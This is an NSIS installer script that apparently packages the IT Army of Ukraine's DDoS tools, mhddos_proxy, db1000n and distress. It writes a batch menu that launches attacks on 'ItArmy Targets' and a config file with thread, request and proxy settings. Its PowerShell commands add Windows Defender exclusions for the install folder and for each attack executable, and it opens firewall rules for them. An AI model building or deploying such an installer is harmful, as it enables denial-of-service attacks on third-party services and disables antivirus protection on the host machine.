!addplugindir "plugins\"

Var uninstallerPath

Section "-hidden"

    ;Search if mhddos_proxy_installer is already installed.
    FindFirst $0 $1 "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    FindClose $0
    StrCmp $1 "" done

    ;Run the uninstaller of the previous install.
    DetailPrint $(inst_unist)
    ExecWait '"$uninstallerPath\${UNINSTALLER_NAME}.exe" /S _?=$uninstallerPath'
    Delete "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    RMDir "$uninstallerPath"

    done:

SectionEnd

Section
  SectionIn RO # Just means if in component mode this is locked

  ;Set output path to the installation directory.
  SetOutPath $INSTDIR

  ;Store installation folder in registry
  WriteRegStr HKLM "Software\${PRODUCT}" "" $INSTDIR

  ;Registry information for add/remove programs
  
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayName" "${PRODUCT}"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "UninstallString" '"$INSTDIR\${UNINSTALLER_NAME}.exe"'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayIcon" '"$INSTDIR\itarmy.ico",0'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "IT Army of Ukraine"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/ukita_installer"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoModify" 1
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoRepair" 1
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
  ${GetSize} "$INSTDIR" "/S=0K" $0 $1 $2
  IntFmt $0 "0x%08X" $0
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "EstimatedSize" "$0"

  ;Create optional start menu shortcut for uninstaller and Main component
  CreateDirectory "$SMPROGRAMS\${PRODUCT}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\Uninstall ${PRODUCT}.lnk" "$INSTDIR\${UNINSTALLER_NAME}.exe" "" "$INSTDIR\${UNINSTALLER_NAME}.exe" 0
  
  nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionPath "$INSTDIR""'

  ;Create uninstaller
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
SectionEnd

Section ;RUNNER
  SetOutPath $INSTDIR
  
  FileOpen $9 runner.bat w
  FileWrite $9 "@ECHO off$\r$\n"
  FileWrite $9 "SET AUTO_MH=1$\r$\n"
  FileWrite $9 "CLS$\r$\n"
  FileWrite $9 "COLOR 0A$\r$\n"
  
  FileWrite $9 ":MAIN$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"
  FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto ITARMY)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_powerfull' goto ITARMY_POWERFULL)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_db1000n' goto ITARMY_DB1000N)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_distress' goto ITARMY_DISTRESS)$\r$\n"
  
  FileWrite $9 ":MAIN_INFO$\r$\n"
  FileWrite $9 "ECHO.$\r$\n"
  FileWrite $9 "ECHO 1. Run MHDDOS_PROXY Attack$\r$\n"
  FileWrite $9 "ECHO 2. Run DB1000N Attack$\r$\n"
  FileWrite $9 "ECHO 3. Run DSTREES Attack$\r$\n"
  FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
  FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
  FileWrite $9 "if '%choice%'=='1' goto ITARMY$\r$\n"
  FileWrite $9 "if '%choice%'=='2' goto ITARMY_DB1000N$\r$\n"
  FileWrite $9 "if '%choice%'=='3' goto ITARMY_DISTRESS$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Start MHDDOS_PROXY Attack ItArmy Targets$\r$\n"
  ${If} ${RunningX64}
	FileWrite $9 "mhddos_proxy_win.exe$\r$\n"
  ${Else}
	FileWrite $9 "mhddos_proxy_win_x86.exe$\r$\n"
  ${EndIf}
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY_DB1000N$\r$\n"
  FileWrite $9 "CD ${DB1000N_DIR}$\r$\n"
  FileWrite $9 "ECHO Start DB1000N Attack ItArmy Targets$\r$\n"
  FileWrite $9 "db1000n.exe -enable-self-update$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY_DISTRESS$\r$\n"
  FileWrite $9 "CD ${DISTRESS_DIR}$\r$\n"
  FileWrite $9 "ECHO Start DISTRESS Attack ItArmy Targets$\r$\n"
  ${If} ${RunningX64}
	FileWrite $9 "distress_x86_64-pc-windows-msvc.exe -c 4096$\r$\n"
  ${Else}
	FileWrite $9 "distress_i686-pc-windows-msvc.exe -c 2048$\r$\n"
  ${EndIf}
  FileWrite $9 "goto END$\r$\n"

  FileWrite $9 ":END$\r$\n"
  FileWrite $9 "EXIT$\r$\n"
  FileClose $9
SectionEnd

Section	"mhddos_proxy"
  SetOutPath ${MHDDOS_PROXY_DIR}

  ;Add mhddos firewall rules
  
  File "resources\mhddos_config.ico"
  
  FileOpen $9 mhddos.ini w
  FileWrite $9 "###$(mhs_settings) mhddos_proxy$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_text_lng)::$\r$\n"
  FileWrite $9 "#lang = ua | en | es | de | pl | lt$\r$\n"
  FileWrite $9 "lang = $(mhs_lang)$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_copies)::$\r$\n"
  FileWrite $9 "#copies = 1 | 2 | auto$\r$\n"
  FileWrite $9 "copies  = 1$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_vpn)::$\r$\n"
  FileWrite $9 "#vpn = true | false$\r$\n"
  FileWrite $9 "vpn = false$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_percents)::$\r$\n"
  FileWrite $9 "#vpn-percents = 2$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_threads)::$\r$\n"
  FileWrite $9 "#threads = 8000$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_requests)::$\r$\n"
  FileWrite $9 "#requests-per-connection  = 2000$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_proxy)::$\r$\n"
  FileWrite $9 "#proxy = [socks4://114.231.123.38:3065, socks5://114.231.123.38:1080]$\r$\n"
  FileWrite $9 "$\r$\n"
  FileWrite $9 "#::$(mhs_proxies)::$\r$\n"
  FileWrite $9 "#proxies = proxies.txt | https://pastebin.com/raw/UkFWzLOt$\r$\n"
  FileClose $9
  
	${If} ${RunningX64}
		File /nonfatal /r "requirements\mhddos\x64\*"
	${Else}
		File /nonfatal /r "requirements\mhddos\x86\*"
	${EndIf}  
   
	DetailPrint "AddAuthorizedApplication UkITA_MHDDOS_PROXY"
${If} ${RunningX64}
	SimpleFC::AddApplication "UkITA_MHDDOS_PROXY" "${MHDDOS_PROXY_DIR}\mhddos_proxy_win.exe" 0 2 "" 1
	nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionProcess "mhddos_proxy_win.exe""'
${Else}
	SimpleFC::AddApplication "UkITA_MHDDOS_PROXY" "${MHDDOS_PROXY_DIR}\mhddos_proxy_win_x86.exe" 0 2 "" 1
	nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionProcess "mhddos_proxy_win_x86.exe""'
${EndIf}
   
  CreateShortCut "$DESKTOP\MHDDOS_PROXY.lnk" "${MHDDOS_PROXY_DIR}\mhddos_proxy_win.exe" "" "${MHDDOS_PROXY_DIR}\mhddos_proxy_win.exe" 0
  CreateShortCut "$DESKTOP\MHDDOS_PROXY_CONFIG.lnk" "${MHDDOS_PROXY_DIR}\mhddos.ini" "" "${MHDDOS_PROXY_DIR}\mhddos_config.ico" 0

SectionEnd

Section	"db1000n"
	SetOutPath ${DB1000N_DIR}
	
  ;Add mhddos firewall rules
	
	File "resources\itarmy_d1000n.ico"

	${If} ${RunningX64}
		File /nonfatal /r "requirements\db1000n\x64\*"
	${Else}
		File /nonfatal /r "requirements\db1000n\x86\*"
	${EndIf}  
 
	DetailPrint "AddAuthorizedApplication UkITA_DB1000N"
	SimpleFC::AddApplication "UkITA_DB1000N" "${DB1000N_DIR}\db1000n.exe" 0 2 "" 1
	nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionProcess "db1000n.exe""'
 
	CreateShortCut "$DESKTOP\DB1000N.lnk" "$INSTDIR\runner.bat" "-itarmy_db1000n" "${DB1000N_DIR}\itarmy_d1000n.ico" 0

SectionEnd

Section "distress"
	;SectionIn RO
	SetOutPath ${DISTRESS_DIR}

  ;Add mhddos firewall rules
	
	File "resources\itarmy_distress.ico"

	${If} ${RunningX64}
		File /nonfatal /r "requirements\distress\x64\*"
	${Else}
		File /nonfatal /r "requirements\distress\x86\*"
	${EndIf}  
 
	DetailPrint "AddAuthorizedApplication UkITA_DISTRESS"
${If} ${RunningX64}
	SimpleFC::AddApplication "UkITA_DISTRESS" "${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" 0 2 "" 1
	nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionProcess "distress_x86_64-pc-windows-msvc.exe""'
${Else}
	SimpleFC::AddApplication "UkITA_DISTRESS" "${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" 0 2 "" 1
	nsExec::Exec 'cmd /c "powershell -ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionProcess "distress_i686-pc-windows-msvc.exe""'
${EndIf}

	CreateShortCut "$DESKTOP\DISTRESS.lnk" "$INSTDIR\runner.bat" "-itarmy_distress" "${DISTRESS_DIR}\itarmy_distress.ico" 0

SectionEnd

var TelegramCheckbox
var DiscordCheckbox

Function ShowFinishCheckbox
${NSD_CreateCheckbox} 125u 175u 100u 15u "$(open_telegram_link)"
Pop $TelegramCheckbox
SetCtlColors $TelegramCheckbox "" "ffffff"

${NSD_CreateCheckbox} 225u 175u 100u 15u "$(open_discord_link)"
Pop $DiscordCheckbox
SetCtlColors $DiscordCheckbox "" "ffffff"
FunctionEnd

Function OpenFinishLink
${NSD_GetState} $TelegramCheckbox $0
${If} $0 <> 0
    ExecShell "open" "${telegram_link}"
${EndIf}

${NSD_GetState} $DiscordCheckbox $0
${If} $0 <> 0
    ExecShell "open" "${discord_link}"
${EndIf}
FunctionEnd

;--------------------------------
;After Installation Function

Function .onInstSuccess

  ;Open 'Thank you for installing' site or something else
  ;ExecShell "open" "https://t.me/itarmyofukraine2022"

FunctionEnd

Function .onInit

  StrCpy $Language ${LANG_UKRAINIAN}
  !insertmacro MUI_LANGDLL_DISPLAY

  ;Search if mhddos_proxy_installer is already installed.
  FindFirst $0 $1 "$INSTDIR\${UNINSTALLER_NAME}.exe"
  FindClose $0
  StrCmp $1 "" done

  ;Copy old value to var so we can call the correct uninstaller
  StrCpy $uninstallerPath $INSTDIR

  ;Inform the user
  MessageBox MB_OKCANCEL|MB_ICONINFORMATION $(inst_uninstall_question) /SD IDOK IDOK done
  Quit

  done:

FunctionEnd